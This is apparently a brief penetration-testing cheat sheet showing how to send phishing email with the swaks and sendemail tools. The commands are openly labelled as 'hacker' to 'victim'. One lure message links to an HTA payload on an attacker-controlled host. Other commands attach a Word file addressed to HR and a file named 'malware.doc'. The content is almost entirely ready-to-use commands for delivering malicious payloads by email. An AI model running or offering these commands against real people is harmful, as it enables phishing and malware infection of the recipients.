
Using Swaks to send email
 
```
swaks --pipeline --server 192.168.x.x --port 25 --from 'hacker@example.org' --to 'victim@example.org' --body 'Issue with Mail Server http://192.168.x.x/email.hta' --header "Subject: Issues with Mail" 

swaks  -attach @wordfile.doc --pipeline --server 192.168.x.x --port 25 --from 'hacker@example.org' --to ' hr@example.org' --body 'your body here' --header "Subject: subject"
``` 

Using Sendmail to send Email


```
sendemail -f attacker@example.com -t receiver@example.com -s 192.168.x.x -u "Your subject here" -m "Your e-mail content here" -a malware.doc
```

